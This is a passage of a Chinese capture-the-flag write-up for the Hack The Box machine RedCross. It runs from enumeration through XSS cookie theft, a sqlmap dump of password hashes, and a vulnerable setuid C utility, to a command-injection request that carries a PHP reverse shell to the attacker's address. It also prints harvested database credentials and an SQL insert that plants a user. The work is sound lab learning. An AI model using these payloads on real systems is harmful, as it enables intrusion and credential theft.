class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.113 -p443,80,22                          <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-30 15:35 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.113<br>Host is up (0.097s latency).<br><br>PORT    STATE SERVICE  VERSION<br>22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 67d385f8eeb8062359d7758ea237d0a6 (RSA)<br>|   256 89b465271f93721abce3227090db3596 (ECDSA)<br>|_  256 66bda11c327432e2e664e8a5251b4d67 (ED25519)<br>80/tcp  open  http     Apache httpd 2.4.25<br>|_http-server-header: Apache/2.4.25 (Debian)<br>|_http-title: Did not follow redirect to https://intra.redcross.htb/<br>443/tcp open  ssl/http Apache httpd 2.4.25<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| tls-alpn: <br>|_  http/1.1<br>| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US<br>| Not valid before: 2018-06-03T19:46:58<br>|_Not valid after:  2021-02-27T19:46:58<br>|_http-title: Did not follow redirect to https://intra.redcross.htb/<br>|_http-server-header: Apache/2.4.25 (Debian)<br>Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.82 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.113 -p443,80,22<br></code></pre></td></tr></table></figure><p>nmap直接扫描出了一个子域名，照这架势看起来像是有vhost：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ wfuzz -u https://redcross.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="hljs-string">&quot;Host:FUZZ.redcross.htb&quot;</span> --hw 28<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: https://redcross.htb/</span><br><span class="hljs-string">Total requests: 114441</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload                                                                                                                      </span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000024:   421        12 L     49 W       407 Ch      &quot;admin&quot;                                                                                                                      </span><br><span class="hljs-string">000000373:   302        0 L      26 W       463 Ch      &quot;intra&quot;                                                                                                                      </span><br><span class="hljs-string">000000689:   400        12 L     53 W       426 Ch      &quot;gc._msdcs&quot; </span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830154926415.png" alt="image-20220830154926415"></p><p>好像我有一个预先的凭证，好吧想多了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ gobuster <span class="hljs-built_in">dir</span> -u https://intra.redcross.htb/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     https://intra.redcross.htb/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>2022/08/30 15:51:30 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/images               (Status: 301) [Size: 327] [--&gt; https://intra.redcross.htb/images/]<br>/pages                (Status: 301) [Size: 326] [--&gt; https://intra.redcross.htb/pages/] <br>/documentation        (Status: 301) [Size: 334] [--&gt; https://intra.redcross.htb/documentation/]<br>/javascript           (Status: 301) [Size: 331] [--&gt; https://intra.redcross.htb/javascript/]   <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830161458764.png" alt="image-20220830161458764"></p><p>好吧，是我请求格式错了。但是依旧没什么用:</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830161640170.png" alt="image-20220830161640170"></p><p>每次点击提交会出现一个请求已发送，便没有了下文。我尝试了xss，当我提交时候，网页会弹出:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">Oops! Someone <span class="hljs-keyword">is</span> trying <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> something nasty...<br></code></pre></td></tr></table></figure><p>或许便是xss，我在当前页面提交内容，后端会有某个用户去处理我的请求，从而导致他的cookie泄露被盗取,在contact phone or email可能不存在什么检测机制：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sudo python -m http.server 80  <br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.10.113 - - [30/Aug/2022 16:29:48] code 404, message File not found<br>10.10.10.113 - - [30/Aug/2022 16:29:48] <span class="hljs-string">&quot;GET /cookie.php?c=PHPSESSID=635hd95ghkjs0ga9rv9tiamek4;%20LANG=EN_US;%20SINCE=1661848189;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1&quot;</span> 404 -<br></code></pre></td></tr></table></figure><p>该cookie可以登录admin：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830163153653.png" alt="image-20220830163153653"></p><p>但进到这里似乎没什么用，添加账户还是会报错。我尝试按照PDF说明去申请凭证，登录了进去：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830163918679.png" alt="image-20220830163918679"></p><p>什么功能也没有，只有右下角的UserID：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sqlmap -r sqltest --delay=1 --batch --dump<br>        ___<br>       __H__<br> ___ ___[,]_____ ___ ___  &#123;1.6.8<span class="hljs-comment">#stable&#125;</span><br>|_ -| . [)]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [(]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 16:50:03 /2022-08-30/<br>[5 entries]<br>+----+------------------------------+------+--------------------------------------------------------------+----------+<br>| <span class="hljs-built_in">id</span> | mail                         | role | password                                                     | username |<br>+----+------------------------------+------+--------------------------------------------------------------+----------+<br>| 1  | admin@redcross.htb           | 0    | $2y$10<span class="hljs-variable">$z</span>/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. | admin    |<br>| 2  | penelope@redcross.htb        | 1    | $2y$10<span class="hljs-variable">$tY9Y955kyFB37GnW4xrC0</span>.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS | penelope |<br>| 3  | charles@redcross.htb         | 1    | $2y$10<span class="hljs-variable">$bj5Qh0AbUM5wHeu</span>/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i | charles  |<br>| 4  | tricia.wanderloo@contoso.com | 100  | $2y$10<span class="hljs-variable">$Dnv</span>/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. | tricia   |<br>| 5  | non@available                | 1000 | $2y$10<span class="hljs-variable">$U16O2Ylt</span>/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi | guest    |<br>+----+------------------------------+------+--------------------------------------------------------------+----------+<br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs coq">+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+<br>| <span class="hljs-type">id</span> | <span class="hljs-type">body</span>                                                                                                                                                                                         | <span class="hljs-type">dest</span> | <span class="hljs-type">origin</span> | <span class="hljs-type">subject</span>                                      |<br><span class="hljs-type">+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+</span><br><span class="hljs-type">| 1</span>  | <span class="hljs-type">You</span>&#x27;re granted <span class="hljs-built_in">with</span> a low privilege access while we&#x27;re processing your credentials request. Our messaging system still <span class="hljs-built_in">in</span> beta status. Please report <span class="hljs-keyword">if</span> you find any incidence.              | <span class="hljs-type">5</span>    | <span class="hljs-type">1</span>      | <span class="hljs-type">Guest</span> Account <span class="hljs-keyword">Info</span>                           |<br><span class="hljs-type">| 2</span>  | <span class="hljs-type">Hi</span> Penny, can you check <span class="hljs-keyword">if</span> is there any problem <span class="hljs-built_in">with</span> the order? I&#x27;m not receiving it <span class="hljs-built_in">in</span> our EDI platform.                                                                                    | <span class="hljs-type">2</span>    | <span class="hljs-type">4</span>      | <span class="hljs-type">Problems</span> <span class="hljs-built_in">with</span> order <span class="hljs-number">02122128</span>                 |<br><span class="hljs-type">| 3</span>  | <span class="hljs-type">Please</span> could you check the admin webpanel? idk what happens but when I&#x27;m checking the messages, alerts popping everywhere!! Maybe a virus?                                                   | <span class="hljs-type">3</span>    | <span class="hljs-type">1</span>      | <span class="hljs-type">Strange</span> behavior                             |<br><span class="hljs-type">| 4</span>  | <span class="hljs-type">Hi</span>, Please check now... Should be arrived <span class="hljs-built_in">in</span> your systems. Please confirm me. Regards.                                                                                                       | <span class="hljs-type">4</span>    | <span class="hljs-type">2</span>      | <span class="hljs-type">Problems</span> <span class="hljs-built_in">with</span> order <span class="hljs-number">02122128</span>                 |<br><span class="hljs-type">| 5</span>  | <span class="hljs-type">Hey</span>, my chief contacted me complaining about some problem <span class="hljs-built_in">in</span> the admin webapp. I thought that you reinforced security on it... Alerts everywhere!!                                           | <span class="hljs-type">2</span>    | <span class="hljs-type">3</span>      | <span class="hljs-type">admin</span> subd webapp problems                   |<br><span class="hljs-type">| 6</span>  | <span class="hljs-type">Hi</span>, Yes it&#x27;s strange because we applied some input filtering on the contact form. <span class="hljs-keyword">Let</span> me check it. I&#x27;ll take care of that since now! KR                                                      | <span class="hljs-type">3</span>    | <span class="hljs-type">2</span>      | <span class="hljs-type">admin</span> subd webapp problems (priority)        |<br><span class="hljs-type">| 7</span>  | <span class="hljs-type">Hi</span>, Please stop checking messages from intra platform, it&#x27;s possible that there is a vuln on your admin side...                                                                              | <span class="hljs-type">1</span>    | <span class="hljs-type">2</span>      | <span class="hljs-type">STOP</span> checking messages from intra (priority) |<br><span class="hljs-type">| 8</span>  | <span class="hljs-type">Sorry</span> but I can&#x27;t <span class="hljs-built_in">do</span> that. It&#x27;s the only way we have to communicate <span class="hljs-built_in">with</span> partners and we are overloaded. Doesn&#x27;t look so bad... besides that what colud happen? Don&#x27;t worry but <span class="hljs-built_in">fix</span> it ASAP. | <span class="hljs-type">2</span>    | <span class="hljs-type">1</span>      | <span class="hljs-type">STOP</span> checking messages from intra (priority) |<br><span class="hljs-type">+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+</span><br></code></pre></td></tr></table></figure><p>密码半天跑不出来。后来我发现好像不用这么麻烦：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830170727384.png" alt="image-20220830170727384"></p><p>在这里添加一个账号就可以直接ssh登录进去了。但这个shell有点怪：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span><br>iptctl.c<br>$ <span class="hljs-built_in">cat</span> iptctl.c <br>/*<br> * Small utility to manage iptables, easily executable from admin.redcross.htb<br> * v0.1 - allow and restrict mode<br> * v0.3 - added check method and interactive mode (still testing!)<br> */<br><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#include &lt;arpa/inet.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#define BUFFSIZE 360</span><br><br>int isValidIpAddress(char *ipAddress)<br>&#123;<br>        struct sockaddr_in sa;<br>        int result = inet_pton(AF_INET, ipAddress, &amp;(sa.sin_addr));<br>        <span class="hljs-built_in">return</span> result != 0;<br>&#125;<br><br>int isValidAction(char *action)&#123;<br>        int a=0;<br>        char value[10];<br>        strncpy(value,action,9);<br>        <span class="hljs-keyword">if</span>(strstr(value,<span class="hljs-string">&quot;allow&quot;</span>)) a=1;<br>        <span class="hljs-keyword">if</span>(strstr(value,<span class="hljs-string">&quot;restrict&quot;</span>)) a=2;<br>        <span class="hljs-keyword">if</span>(strstr(value,<span class="hljs-string">&quot;show&quot;</span>)) a=3;<br>        <span class="hljs-built_in">return</span> a;<br>&#125;<br><br>void cmdAR(char **a, char *action, char *ip)&#123;<br>        a[0]=<span class="hljs-string">&quot;/sbin/iptables&quot;</span>;<br>        a[1]=action;<br>        a[2]=<span class="hljs-string">&quot;INPUT&quot;</span>;<br>        a[3]=<span class="hljs-string">&quot;-p&quot;</span>;<br>        a[4]=<span class="hljs-string">&quot;all&quot;</span>;<br>        a[5]=<span class="hljs-string">&quot;-s&quot;</span>;<br>        a[6]=ip;<br>        a[7]=<span class="hljs-string">&quot;-j&quot;</span>;<br>        a[8]=<span class="hljs-string">&quot;ACCEPT&quot;</span>;<br>        a[9]=NULL;<br>        <span class="hljs-built_in">return</span>;<br>&#125;<br><br>void cmdShow(char **a)&#123;<br>        a[0]=<span class="hljs-string">&quot;/sbin/iptables&quot;</span> ;<br>        a[1]=<span class="hljs-string">&quot;-L&quot;</span>;<br>        a[2]=<span class="hljs-string">&quot;INPUT&quot;</span>;<br>        <span class="hljs-built_in">return</span>;<br>&#125;<br><br>void interactive(char *ip, char *action, char *name)&#123;<br>        char inputAddress[16];<br>        char inputAction[10];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Entering interactive mode\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Action(allow|restrict|show): &quot;</span>);<br>        fgets(inputAction,BUFFSIZE,stdin);<br>        fflush(stdin);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IP address: &quot;</span>);<br>        fgets(inputAddress,BUFFSIZE,stdin);<br>        fflush(stdin);<br>        inputAddress[strlen(inputAddress)-1] = 0;<br>        <span class="hljs-keyword">if</span>(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress))&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: %s allow|restrict|show IP\n&quot;</span>, name);<br>                <span class="hljs-built_in">exit</span>(0);<br>        &#125;<br>        strcpy(ip, inputAddress);<br>        strcpy(action, inputAction);<br>        <span class="hljs-built_in">return</span>;<br>&#125;<br><br>int main(int argc, char *argv[])&#123;<br>        int isAction=0;<br>        int isIPAddr=0;<br>        pid_t child_pid;<br>        char inputAction[10];<br>        char inputAddress[16];<br>        char *args[10];<br>        char buffer[200];<br><br>        <span class="hljs-keyword">if</span>(argc!=3 &amp;&amp; argc!=2)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: %s allow|restrict|show IP_ADDR\n&quot;</span>, argv[0]);<br>                <span class="hljs-built_in">exit</span>(0);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(argc==2)&#123;<br>                <span class="hljs-keyword">if</span>(strstr(argv[1],<span class="hljs-string">&quot;-i&quot;</span>)) interactive(inputAddress, inputAction, argv[0]);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                strcpy(inputAction, argv[1]);<br>                strcpy(inputAddress, argv[2]);<br>        &#125;<br>        isAction=isValidAction(inputAction);<br>        isIPAddr=isValidIpAddress(inputAddress);<br>        <span class="hljs-keyword">if</span>(!isAction || !isIPAddr)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: %s allow|restrict|show IP\n&quot;</span>, argv[0]);<br>                <span class="hljs-built_in">exit</span>(0);<br>        &#125;<br>        puts(<span class="hljs-string">&quot;DEBUG: All checks passed... Executing iptables&quot;</span>);<br>        <span class="hljs-keyword">if</span>(isAction==1) cmdAR(args,<span class="hljs-string">&quot;-A&quot;</span>,inputAddress);<br>        <span class="hljs-keyword">if</span>(isAction==2) cmdAR(args,<span class="hljs-string">&quot;-D&quot;</span>,inputAddress);<br>        <span class="hljs-keyword">if</span>(isAction==3) cmdShow(args);<br><br>        child_pid=fork();<br>        <span class="hljs-keyword">if</span>(child_pid==0)&#123;<br>                setuid(0);<br>                execvp(args[0],args);<br>                <span class="hljs-built_in">exit</span>(0);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(isAction==1) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Network access granted to %s\n&quot;</span>,inputAddress);<br>                <span class="hljs-keyword">if</span>(isAction==2) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Network access restricted to %s\n&quot;</span>,inputAddress);<br>                <span class="hljs-keyword">if</span>(isAction==3) puts(<span class="hljs-string">&quot;ERR: Function not available!\n&quot;</span>);<br>        &#125;<br>&#125;<br>$ <br></code></pre></td></tr></table></figure><p>对于inputAddress似乎是没有任何校验。当尝试拒绝操作时候会触发RCE：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830173335538.png" alt="image-20220830173335538"></p><p>尝试反弹shell会有些问题，尝试读取本地文件：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830173901584.png" alt="image-20220830173901584"></p><p>可以用PHP反弹shell:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/pages/actions.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>admin.redcross.htb<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=635hd95ghkjs0ga9rv9tiamek4; LANG=EN_US; SINCE=1661848189; LIMIT=10; DOMAIN=admin<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>94<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://admin.redcross.htb<br><span class="hljs-attribute">Dnt</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://admin.redcross.htb/?page=firewall<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Te</span><span class="hljs-punctuation">: </span>trailers<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">10.10.16.4</span>;php%<span class="hljs-number">20</span>-r%<span class="hljs-number">20</span>&#x27;%<span class="hljs-number">24</span>sock%<span class="hljs-number">3</span>Dfsockopen(%<span class="hljs-number">2210</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">4</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>C1337)%<span class="hljs-number">3</span>Bexec(%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fbin%<span class="hljs-number">2</span>Fbash%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">263</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">263</span>%<span class="hljs-number">202</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">263</span>%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>B&#x27;&amp;id=<span class="hljs-number">13</span>&amp;action=<span class="hljs-literal">deny</span></span><br></code></pre></td></tr></table></figure><p>下边有这么多postgresql:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@redcross:/var/www/html$ grep -r pg_connect .<br>grep -r pg_connect .<br>./admin/pages/firewall.php:     <span class="hljs-variable">$dbconn</span> = pg_connect(<span class="hljs-string">&quot;host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&amp;&quot;</span>);<br>./admin/pages/users.php:        <span class="hljs-variable">$dbconn</span> = pg_connect(<span class="hljs-string">&quot;host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw&quot;</span>);<br>./admin/pages/actions.php:      <span class="hljs-variable">$dbconn</span> = pg_connect(<span class="hljs-string">&quot;host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&amp;&quot;</span>);<br>./admin/pages/actions.php:      <span class="hljs-variable">$dbconn</span> = pg_connect(<span class="hljs-string">&quot;host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&amp;&quot;</span>);<br>./admin/pages/actions.php:      <span class="hljs-variable">$dbconn</span> = pg_connect(<span class="hljs-string">&quot;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;&quot;</span>);<br>./admin/pages/actions.php:      <span class="hljs-variable">$dbconn</span> = pg_connect(<span class="hljs-string">&quot;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;&quot;</span>);<br>www-data@redcross:/var/www/html$ <br></code></pre></td></tr></table></figure><p>我可以随便生成一个密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@redcross:/var/www/html$ openssl passwd -1 caicaiwhoami<br>openssl passwd -1 caicaiwhoami<br>$1$u4kkiGYK<span class="hljs-variable">$odKUMl6W</span>/7V7Q4KeyDOc21<br>www-data@redcross:/var/www/html$ <br></code></pre></td></tr></table></figure><p>借助postgresql数据库添加一个用户，用户目录指向penelope用户的目录：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">insert</span> into passwd_table (username, passwd, gid, homedir) values (<span class="hljs-string">&#x27;penel&#x27;</span>, <span class="hljs-string">&#x27;<span class="hljs-variable">$1</span><span class="hljs-variable">$u4kkiGYK</span><span class="hljs-variable">$odKUMl6W</span>/7V7Q4KeyDOc21&#x27;</span>, <span class="hljs-number">1000</span>, <span class="hljs-string">&#x27;/home/penelope&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 